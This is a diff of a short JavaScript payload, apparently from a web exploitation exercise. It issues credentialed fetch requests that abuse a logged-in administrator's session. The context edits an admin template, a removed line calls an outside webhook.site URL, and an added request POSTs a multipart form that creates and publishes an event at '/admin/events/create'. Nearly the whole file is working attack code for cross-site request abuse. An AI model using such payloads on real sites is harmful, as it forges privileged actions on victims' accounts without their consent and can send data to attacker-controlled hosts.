@@ -5,5 +5,10 @@ let x = fetch("/admin/templates/1/edit", {
   "mode": "cors",
   "credentials": "include"
 });
-let y =  fetch("https://webhook.site/d1088d17-2a13-4a01-9c67-4e6f3967f9a8/");
+fetch("/admin/events/create", {
+  "body": "------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nTest\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"date\"\r\n\r\n2026-04-16\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n00:00\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nYipeee\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\nPrague\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"ticket_price\"\r\n\r\n1\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"total_tickets\"\r\n\r\n100\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"template_id\"\r\n\r\n1\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"is_published\"\r\n\r\non\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
 console.log("Done")
